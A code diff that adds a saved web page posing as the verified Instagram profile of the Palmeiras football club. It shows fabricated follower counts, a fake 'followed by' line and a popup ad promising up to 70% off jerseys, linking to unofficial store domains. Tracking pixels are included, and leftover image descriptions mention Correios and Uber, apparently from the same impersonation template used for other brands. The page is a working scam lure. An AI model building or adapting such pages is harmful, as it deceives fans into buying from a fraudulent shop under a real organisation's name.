@@ -1,18 +1,458 @@
 
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Palmeiras Store Oficial</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <div class="popup">
-        <h1>Palmeiras Store Oficial</h1>
-        <p>🏆 Semana do Torcedor</p>
-        <p>Comemore a vitória no mundial do Verdão e aproveite descontos de até 70% OFF!</p>
-        <a href="#" class="btn">Ir para o site</a>
+<!-- saved from url=(0041)https://palmeirasstoreoficial.vercel.app/ -->
+<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <script src="./palmeirasstoreoficial.vercel.app_files/1003998320621490" async=""></script><script async="" src="./palmeirasstoreoficial.vercel.app_files/fbevents.js.download"></script><script src="./palmeirasstoreoficial.vercel.app_files/saved_resource"></script>
+    <link href="./palmeirasstoreoficial.vercel.app_files/css2" rel="stylesheet">
+    <link href="./palmeirasstoreoficial.vercel.app_files/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff;
+        }
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .verified-icon {
+            margin-left: 4px;
+            display: inline-flex;
+            align-items: center;
+        }
+        .verified-icon img {
+            width: 14px;
+            height: 14px;
+        }
+        .profile-image-container {
+            width: 84px;
+            height: 84px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            padding: 2px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .profile-image {
+            width: calc(100% - 4px);
+            height: calc(100% - 4px);
+            object-fit: cover;
+            border-radius: 50%;
+            border: 2px solid white;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-icon {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 2px solid #fff;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        .fixed-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: white;
+            z-index: 1000;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+        }
+        .content-padding {
+            padding-top: 40px;
+        }
+        .custom-blue {
+            background-color: #1977F2;
+            color: white;
+        }
+        .custom-blue-text {
+            color: #1977F2;
+        }
+        .btn-text {
+            font-weight: 600;
+        }
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #1977F2;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        .nav-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .search-icon {
+            font-size: 20px;
+        }
+        .plus-icon-container {
+            width: 24px;
+            height: 24px;
+            border: 2px solid black;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .plus-icon {
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .image-with-line {
+            position: relative;
+        }
+        .image-with-line::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 2.5px;
+            background-color: black;
+            margin-bottom: 3px;
+        }
+        #story-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            display: none;
+            overflow: hidden;
+        }
+        #story-content {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .follower-image {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .highlight-image {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .highlight-container {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            border: 2px solid #dbdbdb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 10000;
+            max-width: 90%;
+            width: 300px;
+        }
+        .popup-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .popup-header img {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .popup-header .verified-icon {
+            width: 12px;
+            height: 12px;
+            margin-left: 5px;
+        }
+        .popup-header .ad-label {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-left: 5px;
+        }
+    </style>
+
+<!-- Facebook Pixel Code -->
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src='https://connect.facebook.net/en_US/fbevents.js';
+  s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script');
+
+  fbq('init', '1003998320621490');
+  fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+       src="https://www.facebook.com/tr?id=1003998320621490&ev=PageView&noscript=1"/>
+</noscript>
+<!-- End Facebook Pixel Code -->
+
+    
+
+<script src="./palmeirasstoreoficial.vercel.app_files/latest.js.download" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.fixed{position:fixed}.bottom-0{bottom:0px}.left-0{left:0px}.right-0{right:0px}.mx-auto{margin-left:auto;margin-right:auto}.mb-4{margin-bottom:1rem}.ml-1{margin-left:0.25rem}.ml-2{margin-left:0.5rem}.ml-8{margin-left:2rem}.mt-2{margin-top:0.5rem}.mt-4{margin-top:1rem}.mt-8{margin-top:2rem}.mb-2{margin-bottom:0.5rem}.mb-20{margin-bottom:5rem}.mt-1{margin-top:0.25rem}.block{display:block}.flex{display:flex}.grid{display:grid}.hidden{display:none}.aspect-square{aspect-ratio:1 / 1}.h-48{height:12rem}.h-8{height:2rem}.h-6{height:1.5rem}.min-h-screen{min-height:100vh}.w-48{width:12rem}.w-8{width:2rem}.w-6{width:1.5rem}.w-full{width:100%}.max-w-md{max-width:28rem}.flex-1{flex:1 1 0%}.grid-cols-3{grid-template-columns:repeat(3, minmax(0, 1fr))}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.justify-around{justify-content:space-around}.gap-1{gap:0.25rem}.space-x-2 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(0.5rem * var(--tw-space-x-reverse));margin-left:calc(0.5rem * calc(1 - var(--tw-space-x-reverse)))}.space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.overflow-x-auto{overflow-x:auto}.rounded{border-radius:0.25rem}.rounded-full{border-radius:9999px}.bg-blue-500{--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.object-cover{object-fit:cover}.p-4{padding:1rem}.px-4{padding-left:1rem;padding-right:1rem}.py-1\.5{padding-top:0.375rem;padding-bottom:0.375rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.px-2{padding-left:0.5rem;padding-right:0.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.pt-2{padding-top:0.5rem}.text-center{text-align:center}.text-base{font-size:1rem;line-height:1.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-semibold{font-weight:600}.text-black{--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}</style></head>
+<body class="bg-white">
+    <div id="loading-screen" style="display: none;">
+        <img src="./palmeirasstoreoficial.vercel.app_files/instagram-logo-instagram-icon-transparent-free-png.png" alt="Instagram Logo" class="w-48 h-48">
     </div>
-</body>
-</html>
+
+    <div id="popup" style="display: block;">
+        <div class="popup-header">
+            <img src="./palmeirasstoreoficial.vercel.app_files/logo.png" alt="Uber logo">
+            <span class="font-bold">Palmeiras</span>
+            <img src="./palmeirasstoreoficial.vercel.app_files/saved_resource(1)" alt="Verified icon" class="verified-icon">
+            <span class="ad-label">Publicidade</span>
+        </div>
+        <p class="mb-4">🏆 Semana do Torcedor</p>
+		            <p class="text-sm text-gray-600">Comemore a vitória no mundial do Verdão e aproveite descontos de até 70% OFF em camisas e produtos oficiais!🔥</p>
+                    <p class="text-sm text-gray-600">‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ </p>
+                    <p class="text-sm text-gray-600">✨ Não perca tempo! Acesse agora nosso site e garanta o seu! </p>
+
+        <a href="https://palmeirasstorebrasil.com/collections/mais-vendidos?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=" class="bg-blue-500 text-white px-4 py-2 rounded block text-center">Ir para o site</a>
+    </div>
+
+    <div id="content" class="max-w-md mx-auto bg-white min-h-screen">
+        <header class="fixed-header flex items-center justify-between bg-white">
+            <i class="fas fa-arrow-left text-black text-lg"></i>
+            <h1 class="text-black text-base font-semibold flex items-center">
+                palmeiras
+                <span class="verified-icon">
+                    <img src="./palmeirasstoreoficial.vercel.app_files/saved_resource(1)" alt="Verified icon">
+                </span>
+            </h1>
+            <i class="fas fa-ellipsis-h text-black text-lg"></i>
+        </header>
+
+        <div class="content-padding">
+            <div class="px-4 mt-8">
+                <div class="flex items-center">
+                    <div id="profileImageContainer" class="profile-image-container">
+                        <img id="profileImage" alt="Correios logo with yellow and blue arrows on a green background" class="profile-image" src="./palmeirasstoreoficial.vercel.app_files/logo.png">
+                    </div>
+                    <div class="flex-1 ml-8">
+                        <div class="flex justify-between text-center">
+                            <div>
+                                <div class="font-bold">20.050</div>
+                                <div class="text-xs">publicações</div>
+                            </div>
+                            <div>
+                                <div class="font-bold">7,1 mi</div>
+                                <div class="text-xs">seguidores</div>
+                            </div>
+                            <div>
+                                <div class="font-bold">115</div>
+                                <div class="text-xs">seguindo</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="mt-4">
+                    <h2 class="font-bold">Palmeiras </h2>
+                    <p class="text-sm"> <font color="#1977F2"></font>
+</p><font color="#1977F2">
+                    <p class="text-sm custom-blue-text" style="color: #000000;">Perfil oficial do Maior Campeão do Brasil no Instagram. Faça parte do Avanti e siga os canais de comunicação do</p>
+</font>
+              <a class="custom-blue-text text-sm" href="https://9mjs10-jx.myshopify.com/?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term="></a>
+ 
+                </div>
+
+                
+				                <div class="mt-2 flex items-center">
+                    <img alt="Small profile pictures of followers" class="w-8 h-8 rounded-full" height="30" src="./palmeirasstoreoficial.vercel.app_files/4456129.jpg" width="30">
+                    <p class="text-sm ml-2">Seguido(a) por <strong>raphaelveigaa, vitor_roque9</strong> e <strong>outras 24 pessoas</strong></p>
+                </div>
+                <div class="flex mt-4 space-x-2">
+                    <button id="followButton" class="flex-1 custom-blue py-1.5 rounded flex items-center justify-center">
+                        <span id="buttonText" class="btn-text">Seguir</span>
+                        <div class="loading-icon ml-2"></div>
+                        <svg id="downArrow" class="ml-1 hidden" aria-label="Ícone de seta para baixo" fill="currentColor" height="12" role="img" viewBox="0 0 24 24" width="12">
+                            <title>Ícone de seta para baixo</title>
+                            <path d="M12 16.502l-7.293-7.296a1 1 0 1 1 1.414-1.414L12 13.67l5.879-5.878a1 1 0 1 1 1.414 1.414L12 16.502z"></path>
+                        </svg>
+                    </button>
+                    <button id="messageButton" class="flex-1 text-black py-1.5 rounded" style="background-color: #F3F4F6;">
+                        <span class="btn-text">Mensagem</span>
+                    </button>
+                    <button class="px-2 py-1.5 rounded" style="background-color: #F3F4F6;">
+                        <i class="fas fa-user-plus btn-text"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="flex p-4 space-x-4 overflow-x-auto">
+                <div class="flex flex-col items-center">
+                    <div class="highlight-container">
+                        <img alt="Warning sign for alert" class="highlight-image" src="./palmeirasstoreoficial.vercel.app_files/destaque1.jpg">
+                    </div>
+                    <span class="text-xs mt-1">Avanti Pr...<span>
+                </span></span></div>
+                <div class="flex flex-col items-center">
+                    <div id="ajudeRSContainer" class="highlight-container">
+                        <img id="ajudeRSImage" alt="Help Rio Grande do Sul campaign" class="highlight-image" src="./palmeirasstoreoficial.vercel.app_files/destaque2.jpg">
+                    </div>
+                    <span class="text-xs mt-1">Pay Premiado 💳</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <div id="ajudeRSContainer" class="highlight-container">
+                        <img id="ajudeRSImage" alt="Help Rio Grande do Sul campaign" class="highlight-image" src="./palmeirasstoreoficial.vercel.app_files/destaque3.jpg">
+                    </div>
+                    <span class="text-xs mt-1">PAY 📲</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <div id="ajudeRSContainer" class="highlight-container">
+                        <img id="ajudeRSImage" alt="Help Rio Grande do Sul campaign" class="highlight-image" src="./palmeirasstoreoficial.vercel.app_files/destaque4.jpg">
+                    </div>
+                    <span class="text-xs mt-1">Facebook</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <div id="ajudeRSContainer" class="highlight-container">
+                        <img id="ajudeRSImage" alt="Help Rio Grande do Sul campaign" class="highlight-image" src="./palmeirasstoreoficial.vercel.app_files/destaque5.jpg">
+                    </div>
+                    <span class="text-xs mt-1">X</span>
+                </div>
+            </div>
+            <div class="flex justify-around pt-2 mb-2">
+                <img src="./palmeirasstoreoficial.vercel.app_files/IMG-7309.jpg" alt="Grid icon" class="w-6 h-6 object-cover">
+                <img src="./palmeirasstoreoficial.vercel.app_files/IMG-7305.jpg" alt="Reels icon" class="w-6 h-6 object-cover">
+                <img src="./palmeirasstoreoficial.vercel.app_files/IMG-7306.jpg" alt="User icon" class="w-6 h-6 object-cover">
+            </div>
+            <div class="grid grid-cols-3 gap-1 mt-1">
+                <div class="image-with-line">
+                    <img alt="Correios delivery truck on the road" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post1.png">
+                </div>
+                <img alt="Correios employee delivering a package" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post2.png">
+                <img alt="Correios logo on a building" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post3.png">
+                <img alt="Correios employee sorting packages" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post4.png">
+                <img alt="Correios delivery van parked on the street" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post5.png">
+                <img alt="Correios employee using a handheld device" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post6.png">
+                <img alt="Correios office with customers" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post7.png">
+                <img alt="Correios package being scanned" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post8.png">
+                <img alt="Correios employee at a counter" class="w-full aspect-square object-cover" src="./palmeirasstoreoficial.vercel.app_files/post9.png">
+            </div>
+            <div class="flex flex-col items-center justify-center mt-4 mb-20">
+                <p class="text-gray-500 text-sm mb-2">Carregando publicações antigas</p>
+                <div class="loading-spinner"></div>
+            </div>
+        </div>
+        <nav class="fixed bottom-0 left-0 right-0 bg-white">
+            <div class="flex justify-around py-4 items-center">
+                <div class="nav-icon">
+                    <img src="./palmeirasstoreoficial.vercel.app_files/IMG-7308-2.jpg" alt="Home icon" class="w-6 h-6 object-cover">
+                </div>
+                <div class="nav-icon">
+                    <i class="fas fa-search search-icon"></i>
+                </div>
+                <div class="plus-icon-container">
+                    <span class="plus-icon">+</span>
+                </div>
+                <div class="nav-icon">
+                    <img src="./palmeirasstoreoficial.vercel.app_files/IMG-7307.jpg" alt="Reels icon" class="w-6 h-6 object-cover">
+                </div>
+                <div class="nav-icon">
+                    <img alt="Correios logo with yellow and blue arrows on a green background" class="w-6 h-6 rounded-full" src="./palmeirasstoreoficial.vercel.app_files/logo.png">
+                </div>
+            </div>
+        </nav>
+    </div>
+
+    <div id="story-overlay">
+        <iframe id="story-content" src="./palmeirasstoreoficial.vercel.app_files/saved_resource.html"></iframe>
+    </div>
+
+    <script>
+        setTimeout(function() {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('content').classList.remove('hidden');
+            document.getElementById('popup').style.display = 'block';
+        }, 3000);
+
+        const followButton = document.getElementById('followButton');
+        const buttonText = document.getElementById('buttonText');
+        const loadingIcon = document.querySelector('.loading-icon');
+        const downArrow = document.getElementById('downArrow');
+
+        followButton.addEventListener('click', function() {
+            buttonText.style.display = 'none';
+            loadingIcon.style.display = 'block';
+            
+            setTimeout(function() {
+                loadingIcon.style.display = 'none';
+                buttonText.style.display = 'inline';
+                buttonText.textContent = 'Seguindo';
+                downArrow.classList.remove('hidden');
+                
+                followButton.classList.remove('custom-blue');
+                followButton.style.backgroundColor = '#F3F4F6'; 
+                followButton.classList.add('text-black');
+                downArrow.setAttribute('fill', 'currentColor');
+            }, 2000);
+        });
+
+        const messageButton = document.getElementById('messageButton');
+        messageButton.addEventListener('click', function() {
+            window.location.href = '';
+        });
+
+        const profileImage = document.getElementById('profileImage');
+        const profileImageContainer = document.getElementById('profileImageContainer');
+        const storyOverlay = document.getElementById('story-overlay');
+        const storyContent = document.getElementById('story-content');
+
+        let isClicked = false;
+
+        profileImage.addEventListener('click', function() {
+            if (!isClicked) {
+                isClicked = true;
+                profileImageContainer.style.background = '#f0f0f0';
+            }
+
+            storyContent.src = 'story.html';
+            storyOverlay.style.display = 'block';
+            
+            setTimeout(() => {
+                storyOverlay.style.display = 'none';
+                storyContent.src = '';
+            }, 15000);
+        });
+    </script>
+
+
+</body></html>
